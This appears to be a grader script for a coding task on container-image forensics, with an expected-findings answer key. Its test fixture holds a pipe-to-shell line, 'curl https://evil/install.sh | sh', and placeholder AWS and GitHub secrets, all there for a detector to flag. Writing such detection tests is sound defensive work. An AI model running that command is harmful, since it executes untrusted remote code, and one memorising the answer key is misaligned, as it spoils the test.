#!/usr/bin/env python3
import importlib.util,json,sys
from pathlib import Path
SERVICE_ID="container_layer_forensics"
def write_result(r):
 d=Path("/logs/verifier");details={"reward":r,"solved_service_ids":[SERVICE_ID] if r else [],"unsolved_service_ids":[] if r else [SERVICE_ID]}
 try:d.mkdir(parents=True,exist_ok=True)
 except Exception:d=Path("logs/verifier");d.mkdir(parents=True,exist_ok=True)
 (d/"reward.txt").write_text(f"{r}\n");(d/"details.json").write_text(json.dumps(details,indent=2,sort_keys=True));print(json.dumps(details))
def load():
 p=Path("/src/solution.py") if Path("/src/solution.py").exists() else Path("solution.py");spec=importlib.util.spec_from_file_location("solution",p);m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m);return m.ImageForensics()
def main():
 image={"entrypoint":["/app/server"],"imports":{"/app/server":["openssl","curl"]},"layers":[
  {"index":0,"files":{"/bin/ping":{"setuid":False,"caps":[]}},"history":"FROM base","env":{}},
  {"index":1,"files":{"/root/.aws/credentials":{"content":"aws_secret_access_key=ABCD"},"/usr/bin/helper":{"setuid":True,"owner":"root","caps":["cap_sys_admin"]}},"history":"ARG TOKEN=ghp_deadbeef"},
  {"index":2,"whiteouts":["/root/.aws/credentials"],"history":"rm /root/.aws/credentials"},
  {"index":3,"files":{"/app/install.sh":{"content":"curl https://evil/install.sh | sh"}},"history":"RUN curl https://evil/install.sh | sh"}],
  "sbom":[{"name":"openssl","version":"1.0.1","severity":"critical","cve":"CVE-X","reachable":True},{"name":"zlib","version":"1.2.11","severity":"high","cve":"CVE-Y","reachable":False}]}
 got=load().scan(image,{"severity_threshold":"high"})
 exp=[{"layer":1,"type":"PRIVILEGE_DRIFT","evidence":"/usr/bin/helper setuid cap_sys_admin"},{"layer":1,"type":"SECRET_IN_HISTORY","evidence":"aws_secret_access_key"},{"layer":1,"type":"SECRET_IN_HISTORY","evidence":"ghp_deadbeef"},{"layer":2,"type":"WHITEOUT_HIDE","evidence":"/root/.aws/credentials"},{"layer":3,"type":"UNPINNED_REMOTE_EXEC","evidence":"curl https://evil/install.sh | sh"},{"layer":999,"type":"REACHABLE_CVE","evidence":"openssl CVE-X critical"}]
 assert got==exp,json.dumps(got,indent=2)
 write_result(1.0);return 0
if __name__=="__main__":
 try:sys.exit(main())
 except Exception as exc:write_result(0.0);print(f"Verifier failure: {exc}",file=sys.stderr);sys.exit(1)
